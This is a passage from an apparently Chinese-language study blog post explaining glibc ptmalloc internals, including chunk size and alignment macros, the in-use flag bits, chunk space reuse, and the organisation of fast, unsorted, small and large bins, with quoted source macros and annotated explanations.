smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE </span></span><br><span class="line"> (<span class="type">unsigned</span> <span class="type">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p)</span></span><br><span class="line"> ((<span class="type">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem (p))</span><br><span class="line"> &amp; MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>​对于<strong>已经分配的 chunk</strong>，<strong>通过 chunk2mem 宏根据 chunk 地址获得返回给用户的内存地址</strong>，反过来<strong>通过 mem2chunk 宏根据 mem 地址得到 chunk 地址</strong>，chunk 的地址是按 <strong>2 * SIZE_SZ 对齐</strong>的，而 chunk 结构体的<strong>前两个域刚好也是 2*SIZE_SZ 大小</strong>，所以，<strong>mem 地址也是 2 * SIZE_SZ 对齐的</strong>。宏 aligned_OK 和misaligned_chunk(p)用于校验地址是否是按 2 * SIZE_SZ 对齐的。 <strong>MIN_CHUNK_SIZE 定义了最小的 chunk 的大小，32 位平台上位 16 字节，64 位平台为 24 字节或是 32 字节</strong>。<strong>MINSIZE 定义了最小的分配的内存大小</strong>，是对 MIN_CHUNK_SIZE 进行了 2*SIZE_SZ 对齐，地址对齐后与 MIN_CHUNK_SIZE 的大小仍然是一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">检查一个请求是否过大，以至于在填充和对齐时会绕回零。为了简化其他代码，边界被设置得足够低，以至于添加MINSIZE也不会绕回零。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req) </span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">long</span>)(req) &gt;= </span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br><span class="line"><span class="comment">/* 将请求的字节数填充为可用的大小 - 内部版本 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req) </span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) </span><br><span class="line">     ? MINSIZE </span><br><span class="line">     : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"><span class="comment">/* 相同功能，同时执行参数检查 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) </span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123; </span><br><span class="line">    MALLOC_FAILURE_ACTION; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    (sz) = request2size(req);</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>这几个宏用于将用户请求的分配大小转换成内部需要分配的 chunk 大小，这里需要注意 的在转换时不但考虑的地址对齐，还额外加上了 SIZE_SZ，这意味着 ptmalloc 分配内存需要 一个额外的overhead，为SIZE_SZ字节，通过chunk的空间复用，我们很容易得出这个overhead 为 SIZE_SZ。</p><p><strong>wiki:   当一个 chunk 处于已分配状态时，它的物理相邻的下一个 chunk 的 prev_size 字段必然是无效的，故而这个字段就可以被当前这个 chunk 使用。这就是 ptmalloc 中 chunk 间的复用。具体流程如下</strong></p><ol><li>首先，利用 <strong>REQUEST_OUT_OF_RANGE 判断</strong>是否可以分配用户请求的字节大小的 chunk。</li><li>其次，需要注意的是用户请求的字节是用来存储数据的，即 chunk header 后面的部分。与此同时，由于 chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。</li><li>由于系统中所允许的申请的 chunk 最小是 MINSIZE，所以与其进行比较。如果<strong>不满足最低要求，那么就需要直接分配 MINSIZE 字节。</strong></li><li><strong>如果大于的话</strong>，因为系统中申请的 chunk 需要 2 * SIZE_SZ 对齐，所以这里需要<strong>加上 MALLOC_ALIGN_MASK 以便于对齐。</strong></li></ol><p>以 Linux X86_64 平台为例，假设 SIZE_SZ 为 8 字节，空闲时，<strong>一个 chunk 中至少要 4 个 size_t（8B）大小的空间，用来存储 prev_size，size，fd 和 bk，也就是 MINSIZE（32B），chunk 的大小要对齐到 2 * SIZE_SZ（16B）。</strong>当一个 chunk <strong>处于使用状态时</strong>，它的下一个 chunk 的 <strong>prev_size 域肯定是无效</strong>的。所以实际上，这个空间也<strong>可以被当前 chunk 使用</strong>。这听起来有点 不可思议，但确实是<strong>合理空间复用</strong>的例子。故而实际上，一个使用中的 chunk 的大小的计算公式应该是：<strong>in_use_size &#x3D; (用户请求大小+ 16 - 8 ) align to 8B</strong>，这里加 16 是因为需要存储 prev_size 和 size，但又因为向下一个 chunk“借”了 8B，所以要减去 8，<strong>每分配一个 chunk 的 overhead 为 8B</strong>，即 <strong>SIZE_SZ 的大小</strong>。最后，因为空闲的 chunk 和使用中的 chunk 使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即**最终的分配空间 chunk_size &#x3D; max(in_use_size, 32)**。这就是当用户请求内存分配时，ptmalloc 实际需要分配的内存大小。 </p><p><strong>注意：如果 chunk 是由 mmap ()直接分配的，则该 chunk 不会有前一个 chunk 和后一个 chunk，所有本 chunk 没有下一个 chunk 的 prev_size 的空间可以“借”，所以对于直接 mmap() 分配内存的 overhead 为 2 * SIZE_SZ,因为每个<code>mmap()</code>分配的内存块都有一个额外的头部和尾部，用于管理和维护内存的相关信息。</strong></p><p>对于使用<code>mmap()</code>直接分配的内存块，其内存布局通常是独立的，与其他内存块没有前后关系。因此，这些内存块不会有前一个块或后一个块，也就无法利用前一个块的<code>prev_size</code>字段来存储额外的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 当前一个相邻的内存块正在使用时，将 size 字段与 PREV_INUSE 进行按位或操作 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1 </span></span><br><span class="line"><span class="comment">/* 提取前一个内存块的使用位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p) ((p)-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"><span class="comment">/* 当内存块是通过 mmap() 函数获取时，将 size 字段与 IS_MMAPPED 进行按位或操作 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="comment">/* 检查内存块是否是通过 mmap() 函数获取的 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED) </span></span><br><span class="line"><span class="comment">/* 当内存块来自非主要堆区时，将 size 字段与 NON_MAIN_ARENA 进行按位或操作。</span></span><br><span class="line"><span class="comment">   这仅在必要时在将内存块交给用户之前设置。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"><span class="comment">/*检查内存块是否来自非主要堆区 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p><strong>解释：</strong></p><ol><li><code>PREV_INUSE</code>（0x1）：用于表示前一个相邻内存块是否正在使用的标志位。当前一个内存块处于使用状态时，<strong>将该标志位设置为1。</strong></li><li><code>prev_inuse(p)</code>：用于提取给定内存块（<code>p</code>）的前一个内存块的使用状态。通过与<code>PREV_INUSE</code>进行按位与操作，可以获取前一个内存块的使用状态。</li><li><code>IS_MMAPPED</code>（0x2）：用于表示内存块是否是通过<code>mmap()</code>函数获得的标志位。当内存块是通过<code>mmap()</code>函数分配的时，<strong>将该标志位设置为1。</strong></li><li><code>chunk_is_mmapped(p)</code>：用于检查给定内存块（<code>p</code>）是否是通过<code>mmap()</code>函数分配的内存块。<strong>通过与<code>IS_MMAPPED</code>进行按位与操作，可以判断内存块是否是通过<code>mmap()</code>函数分配的。</strong></li><li><code>NON_MAIN_ARENA</code>（0x4）：用于表示内存块是否来自非主要堆区（non-main arena）的标志位。非主要堆区是glibc中用于管理多个堆的机制，<strong>当内存块来自非主要堆区时，将该标志位设置为1。</strong></li><li><code>chunk_non_main_arena(p)</code>：用于检查给定内存块（<code>p</code>）是否来自非主要堆区。<strong>通过与<code>NON_MAIN_ARENA</code>进行按位与操作，可以判断内存块是否来自非主要堆区。</strong></li></ol><p>chunk 在分割时总是以地址对齐（默认是 8 字节，可以自由设置，但是 8 字节是最小值 并且设置的值必须是 2 为底的幂函数值，即是 alignment &#x3D; 2^n，n 为整数且 n&gt;&#x3D;3）的方式来 进行的，所以用 chunk-&gt;size 来存储本 chunk 块大小字节数的话，其<strong>末 3bit 位</strong>总是 0，因此 <strong>这三位可以用来存储其它信息</strong>，比如： </p><p><strong>以第 0 位作为 P 状态位</strong>，标记<strong>前一</strong>chunk 块是否在使用中，<strong>为 1 表示使用，为 0 表示空闲</strong>。 </p><p><strong>以第 1 位作为 M 状态位</strong>，标记本 chunk 块<strong>是否是使用 mmap()直接从进程的 mmap 映射区域分配的</strong>，<strong>为 1 表示是，为 0 表示否。</strong> </p><p><strong>以第 2 位作为 A 状态位</strong>，标记本 chunk <strong>是否属于非主分配区</strong>，<strong>为 1 表示是，为 0 表示 否</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"> Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment"> macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment"> cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment"> people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)( ((char*)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS) ))</span></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)( ((char*)(p)) - ((p)-&gt;prev_size) ))</span></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char*)(p)) + (s)))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">提取大小时要屏蔽的位</span></span><br><span class="line"><span class="comment">注意：在那些不应该看到 mmapped 块的宏中，意图上并没有从大小字段中屏蔽 IS_MMAPPED。</span></span><br><span class="line"><span class="comment">如果由于意外而尝试这样做，这应该导致有用的核心转储发生，以帮助扩展或调整此 malloc 实现的人员。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* 获取大小，忽略使用位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* 指向下一个物理 malloc_chunk 的指针 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)( ((char)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS) ))</span></span><br><span class="line"><span class="comment">/* 指向前一个物理 malloc_chunk 的指针 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)( ((char)(p)) - ((p)-&gt;prev_size) ))</span></span><br><span class="line"><span class="comment">/* 将 ptr + offset 处的空间视为一个块 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char)(p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>这些宏的作用如下：</p><ol><li><code>SIZE_BITS</code>：<strong>用于屏蔽提取大小时不需要的位</strong>。其中包括 <code>PREV_INUSE</code>、<code>IS_MMAPPED</code> 和 <code>NON_MAIN_ARENA</code>。这些位用于标记内存块的状态和属性。</li><li><code>chunksize(p)</code>：<strong>用于获取给定内存块（<code>p</code>）的大小</strong>。通过将内存块的 size 字段与 <code>SIZE_BITS</code> 进行按位与操作，可以得到实际的内存块大小，忽略了使用位。</li><li><code>next_chunk(p)</code>：<strong>用于获取给定内存块（<code>p</code>）的下一个物理 <code>malloc_chunk</code> 的指针</strong>。通过将内存块的地址加上内存块的大小（忽略了使用位），可以得到下一个物理内存块的地址。</li><li><code>prev_chunk(p)</code>：<strong>用于获取给定内存块（<code>p</code>）的前一个物理 <code>malloc_chunk</code> 的指针</strong>。通过将内存块的地址减去前一个内存块的 <code>prev_size</code> 字段的值，可以得到前一个物理内存块的地址。</li><li><code>chunk_at_offset(p, s)</code>：<strong>将给定内存块（<code>p</code>）的地址加上偏移量 <code>s</code>，将结果视为一个块的指针</strong>。这个宏用于在指定偏移量处处理内存块。</li></ol><p>prev_size 字段虽然在当前 chunk 块结构体内，<strong>记录的却是前一个邻接 chunk 块的信息</strong>， 这样做的好处就是我们通过本块 chunk 结构体就可以直接获取到前一 chunk 块的信息，从而 方便做进一步的处理操作。相对的，当前 chunk 块的 foot 信息就存在于下一个邻接 chunk 块的结构体内。字段 prev_size 记录的什么信息呢？有两种情况： </p><p>1）如果前一个邻接 chunk 块空闲，那么当前 chunk 块结构体内的 prev_size 字段记录的 是前一个邻接 chunk 块的大小。这就是由当前 chunk 指针获得前一个空闲 chunk 地址的依据。 宏 prev_chunk(p)就是依赖这个假设实现的。 </p><p>2）如果前一个邻接 chunk 在使用中，则当前 chunk 的 prev_size 的空间被前一个 chunk 借用中，其中的值是前一个 chunk 的内存内容，对当前 chunk 没有任何意义。 </p><p>字段 size 记录了本 chunk 的大小，无论下一个 chunk 是空闲状态或是被使用状态，都可以通过本 chunk 的地址加上本 chunk 的大小，得到下一个 chunk 的地址，由于 size 的低 3 个 bit 记录了控制信息，需要屏蔽掉这些控制信息，取出实际的 size 在进行计算下一个 chunk 地址，这是 next_chunk(p)的实现原理。</p><p><strong>浅浅理解：标志位是不占用内存大小的，实际size包含例如pre_size之类的管理信息</strong></p><p>宏 chunksize(p)用于获得 chunk 的实际大小，需要屏蔽掉 size 中的控制信息。</p><p> 宏 chunk_at_offset(p, s)将 p+s 的地址强制看作一个 chunk。 </p><p><strong>注意：按照边界标记法，可以有多个连续的并且正在被使用中的 chunk 块，但是不会有 多个连续的空闲 chunk 块，因为连续的多个空闲 chunk 块一定会合并成一个大的空闲 chunk 块。</strong></p><p><strong>补充：合并空闲块的目标通常是为了提高内存利用率和减少内存碎片化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 提取 p 的 inuse 位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)</span></span><br><span class="line">((((mchunkptr)(((<span class="type">char</span>)(p))+((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span><br><span class="line"><span class="comment">/* 设置/清除块的 inuse 位，同时不影响其他属性 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)</span></span><br><span class="line">((mchunkptr)(((<span class="type">char</span>)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)</span></span><br><span class="line">((mchunkptr)(((<span class="type">char</span>*)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span><br></pre></td></tr></table></figure><ul><li><code>inuse(p)</code> 宏用于提取给定内存块 <code>p</code> 的 inuse 位。通过对 <code>p</code> 进行位运算和指针偏移，获取下一个内存块的起始位置，并从其 <code>size</code> 字段中提取出 PREV_INUSE 位的值，<strong>以确定 <code>p</code> 是否被标记为已使用。</strong></li><li><code>set_inuse(p)</code> 宏<strong>用于将给定内存块 <code>p</code> 标记为已使用，而不影响其他属性</strong>。通过对 <code>p</code> 进行位运算和指针偏移，获取下一个内存块的起始位置，并将其 <code>size</code> 字段中的 PREV_INUSE 位置为 1，表示该内存块已被使用。</li><li><code>clear_inuse(p)</code> 宏<strong>用于将给定内存块 <code>p</code> 标记为未使用，而不影响其他属性</strong>。通过对 <code>p</code> 进行位运算和指针偏移，获取下一个内存块的起始位置，并将其 <code>size</code> 字段中的 PREV_INUSE 位清零，表示该内存块未被使用。</li></ul><p>上面的这一组宏<strong>用于 check&#x2F;set&#x2F;clear 当前 chunk 使用标志位，</strong>当前 chunk 的使用标志位存储在下一个 chunk 的 size 的第 0 bit（P 状态位），所以首先要获得下一个 chunk 的地址， 然后 check&#x2F;set&#x2F;clear 下一个 chunk 的 size 域的第 0 bit。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s)</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span>*)(p)) + (s)))-&gt;size |= PREV_INUSE)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p, s)</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span>*)(p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br></pre></td></tr></table></figure><p>上面的三个宏用于 check&#x2F;set&#x2F;clear <strong>指定 chunk 的 size 域中的使用标志位</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s) ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s) ((p)-&gt;size = (s))</span></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s) (((mchunkptr)((char*)(p) + (s)))-&gt;prev_size = (s))</span></span><br></pre></td></tr></table></figure><p> 宏 set_head_size(p, s)用<strong>于设置当前 chunk p 的 size 域并保留 size 域的控制信息</strong>。宏 set_head(p, s) 用于设置当前 chunk p 的 size 域并忽略已有的 size 域控制信息。宏 set_foot(p,  s)用于设置当前 chunk p 的下一个 chunk 的 prev_size 为 s，s 为当前 chunk 的 size，<strong>只有当 chunk  p 为空闲时才能使用这个宏</strong>，<strong>当前 chunk 的 foot 的内存空间存在于下一个 chunk，即下一个 chunk 的 prev_size。</strong></p><h5 id="5-2-分箱式内存管理"><a href="#5-2-分箱式内存管理" class="headerlink" title="5.2 分箱式内存管理"></a>5.2 分箱式内存管理</h5><p>​对于空闲的 chunk，ptmalloc 采用分箱式内存管理方式，<strong>根据空闲 chunk 的大小和处于的状态将其放在四个不同的 bin 中</strong>，这四个空闲 chunk 的容器包括 <strong>fast bins，unsorted bin， small bins 和 large bins</strong>。<strong>Fast bins</strong> 是<strong>小内存块的高速缓存</strong>，当一些大小<strong>小于 64 字节的 chunk 被回收时</strong>，<strong>首先会放入 fast bins 中</strong>，在<strong>分配小内存时</strong>，<strong>首先会查看 fast bins 中是否有合适的 内存块</strong>，如果存在，则直接返回 fast bins 中的内存块，以加快分配速度。<strong>Usorted bin 只有一个</strong>，<strong>回收的 chunk 块必须先放到 unsorted bin 中</strong>，<strong>分配内存时会查看 unsorted bin 中是否有合适的 chunk</strong>，如果找到满足条件的 chunk，则直接返回给用户，<strong>否则将 unsorted bin 的所有 chunk 放入 small bins 或是 large bins 中</strong>。Small bins 用于<strong>存放固定大小的 chunk</strong>，共 <strong>64</strong> 个 bin，<strong>最小的 chunk 大小为 16 字节或 32 字节</strong>，每个 bin 的<strong>大小相差 8 字节或是 16 字节</strong>，当 分配小内存块时，采用<strong>精确匹配</strong>的方式从 small bins 中查找合适的 chunk。<strong>Large bins 用于存 储大于等于 512B 或 1024B 的空闲 chunk</strong>，这些 chunk 使用双向链表的形式按大小顺序排序， <strong>分配内存时按最近匹配方式从 large bins 中分配 chunk</strong>。</p><h5 id="问题小结"><a href="#问题小结" class="headerlink" title="问题小结"></a>问题小结</h5><p><strong>问题：为什么bin数组在遍历的时候会往前跨两个地址，并且将bin元素强转成chunk指针类型？</strong></p><p><strong>解答：因为chunk指针指向chunk，如果直接使用bin数组的fd和bk来寻址，那么链表会断掉，因为类型不符合</strong></p><p>太强了！！ 强转很重要！！！！</p><p>bin 通用的宏如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i)                                                           </span></span><br><span class="line">    (mbinptr)(((<span class="type">char</span> *) &amp;((m)-&gt;bins[ ((i) <span class="number">-1</span>) * <span class="number">2</span> ])) -       <span class="comment">//这里往前跨两个且强转         </span></span><br><span class="line">              offsetof(<span class="keyword">struct</span> malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">//获取下一个bin的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 这两个宏可以用来遍历bin</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表头的 chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b) ((b)-&gt;fd)</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表尾的 chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b) ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><h5 id="5-2-1-Small-bins"><a href="#5-2-1-Small-bins" class="headerlink" title="5.2.1 Small bins"></a>5.2.1 Small bins</h5><p>​ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index 有如下关系： <strong>Chunk_size&#x3D;2 * SIZE_SZ * index</strong> </p><p>​在 <strong>SIZE_SZ 为 4B</strong> 的平台上，small bins 中的 chunk <strong>大小是以 8B 为公差的等差数列</strong>，最大 的 chunk 大小为 <strong>504B</strong>，最小的 chunk 大小为 <strong>16B</strong>，所以<strong>实际共 62 个 bin</strong>。分别为 <strong>16B、24B、 32B，„„，504B</strong>。在 <strong>SIZE_SZ 为 8B</strong> 的平台上，small bins 中的 chunk <strong>大小是以 16B 为公差的等差数列</strong>，最大的 chunk 大小为 <strong>1008B</strong>，最小的 chunk 大小为 <strong>32B</strong>，所以<strong>实际共 62 个 bin</strong>。 分别为 <strong>32B、48B、64B，…… ，1008B</strong>。 </p><p>​<strong>ptmalloc 维护了 62 个双向环形链表</strong>（每个链表<strong>都具有链表头节点</strong>，加头节点的最大作用就是便于对链表内节点的统一处理，即简化编程），<strong>每一个链表内的各空闲 chunk 的大小一致</strong>，因此<strong>当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了</strong>， 这样既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可 以用如下图来表示在 SIZE_SZ 为 4B 的平台上 ptmalloc 对 512B 字节以下的空闲 chunk 组织方 式（所谓的分箱机制）</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212588.png" alt="image-20231219202911816"></p><h5 id="5-2-2-Large-bins"><a href="#5-2-2-Large-bins" class="headerlink" title="5.2.2 Large bins"></a>5.2.2 Large bins</h5><p>​在 SIZE_SZ 为 4B 的平台上，大于等于 512B 的空闲 chunk，或者，在 SIZE_SZ 为 8B 的平 台上，大小大于等于 1024B 的空闲 chunk，由 sorted bins 管理。<strong>Large bins 一共包括 63 个 bin</strong>， <strong>每个 bin 中的 chunk 大小不是一个固定公差的等差数列</strong>，而是<strong>分成 6 组 bin</strong>，<strong>每组 bin 是一个 固定公差的等差数列</strong>，每组的 bin <strong>数量依次为 32、16、8、4、2、1</strong>，<strong>公差依次为 64B、512B、 4096B、32768B、262144B 等</strong>。</p><p>​以 SIZE_SZ 为 4B 的平台为例，第一个 large bin 的起始 chunk 大小为 512B，共 32 个 bin， 公差为 64B，等差数列满足如下关系：</p><p>​<strong>Chunk_size&#x3D;512 + 64 * index</strong></p><p>​第二个 large bin 的起始 chunk 大小为第一组 bin 的结束 chunk 大小，满足如下关系： </p><p>​<strong>Chunk_size&#x3D;512 + 64 * 32 + 512 * index</strong> </p><p>​同理，我们可计算出每个 bin 的起始 chunk 大小和结束 chunk 大小。这些 bin 都是很有规律的，其实 small bins 也是满足类似规律，small bins 可以看着是公差为 8 的等差数列，一 共有 64 个 bin<strong>（第 0 和 1bin 不存在）</strong>，所以我们可以将 small bins 和 large bins 存放在同一个包含 128 个 chunk 的数组上，数组的前一部分位 small bins，后一部分为 large bins，每个 bin 的 index 为 chunk 数组的下标，于是，我们可以根据数组下标计算出该 bin 的 chunk 大小（small bins）或是 chunk 大小范围（large bins），也可以根据需要分配内存块大小计算出所需 chunk 所属 bin 的 index，ptmalloc 使用了一组宏巧妙的实现了这种计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 